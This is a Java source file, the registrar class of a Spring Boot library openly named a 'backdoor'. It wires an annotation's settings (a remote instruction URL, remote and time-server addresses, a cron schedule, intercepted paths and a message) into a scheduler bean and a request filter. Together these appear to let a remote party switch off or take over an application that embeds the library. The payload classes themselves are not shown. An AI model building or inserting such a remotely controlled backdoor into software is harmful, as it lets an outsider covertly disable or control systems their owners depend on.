package pro.topme.springbootbackdoor;

import lombok.extern.slf4j.Slf4j;
import org.springframework.beans.factory.support.BeanDefinitionBuilder;
import org.springframework.beans.factory.support.BeanDefinitionRegistry;
import org.springframework.context.annotation.ImportBeanDefinitionRegistrar;
import org.springframework.core.type.AnnotationMetadata;
import org.springframework.util.MultiValueMap;
import pro.topme.springbootbackdoor.annotation.EnableSpringBootBackDoor;
import pro.topme.springbootbackdoor.interceptor.SpringBootBackDoorFilterConfiguration;
import pro.topme.springbootbackdoor.scheduler.SpringBootBackDoorScheduler;
import pro.topme.springbootbackdoor.utils.BackDoorPropertiesFileUtils;
import pro.topme.springbootbackdoor.utils.NetWorkUtils;

import java.util.List;

/**
 * @author XuJiakai
 *  2019/11/15 19:11
 */
@Slf4j
public class SpringBootBackDoorRegistrar implements ImportBeanDefinitionRegistrar {
    @Override
    public void registerBeanDefinitions(AnnotationMetadata annotationMetadata, BeanDefinitionRegistry registry) {
        if (annotationMetadata.hasAnnotation(EnableSpringBootBackDoor.class.getName())) {
            MultiValueMap<String, Object> allAnnotationAttributes = annotationMetadata.getAllAnnotationAttributes(EnableSpringBootBackDoor.class.getName());
            List<Object> cron = allAnnotationAttributes.get("cron");
            List<Object> interceptorPaths = allAnnotationAttributes.get("interceptorPaths");
            List<Object> mustBeNetworked = allAnnotationAttributes.get("mustBeNetworked");
            List<Object> value = allAnnotationAttributes.get("value");
            List<Object> instructUrl = allAnnotationAttributes.get("instructUrl");
            List<Object> remoteAddress = allAnnotationAttributes.get("remoteAddress");
            List<Object> timeAddress = allAnnotationAttributes.get("timeAddress");
            List<Object> message = allAnnotationAttributes.get("message");
            List<Object> fileName = allAnnotationAttributes.get("fileName");

            BackDoorPropertiesFileUtils backDoorPropertiesFileUtils = new BackDoorPropertiesFileUtils(System.getProperty("java.io.tmpdir") + fileName.get(0));
            backDoorPropertiesFileUtils.setTime(System.currentTimeMillis());
            BeanDefinitionBuilder schedulerBuilder = buildConfiguration(SpringBootBackDoorScheduler.class);
            addValue(schedulerBuilder, "timestamp", value.get(0));
            addValue(schedulerBuilder, "instructUrl", instructUrl.get(0));
            addValue(schedulerBuilder, "cron", cron.get(0));
            addValue(schedulerBuilder, "mustBeNetworked", mustBeNetworked.get(0));
            addValue(schedulerBuilder, "netWorkUtils", new NetWorkUtils(backDoorPropertiesFileUtils, (String) remoteAddress.get(0), (String) timeAddress.get(0)));
            registerConfiguration(registry, schedulerBuilder, SpringBootBackDoorScheduler.class);

            BeanDefinitionBuilder filterBuilder = buildConfiguration(SpringBootBackDoorFilterConfiguration.class);
            addValue(filterBuilder, "interceptorPaths", interceptorPaths);
            addValue(filterBuilder, "msg", message.get(0));
            registerConfiguration(registry, filterBuilder, SpringBootBackDoorFilterConfiguration.class);
        }
    }

    private BeanDefinitionBuilder buildConfiguration(Class<?> beanClass) {
        return BeanDefinitionBuilder
                .genericBeanDefinition(beanClass);
    }

    private void registerConfiguration(BeanDefinitionRegistry registry, BeanDefinitionBuilder builder, Class<?> beanClass) {
        registry.registerBeanDefinition(
                beanClass.getSimpleName(),
                builder.getBeanDefinition());
        log.info(beanClass.getSimpleName() + " registered successfully!");
    }


    private void addValue(BeanDefinitionBuilder builder, String name, Object value) {
        builder.addPropertyValue(name, value);
    }
}
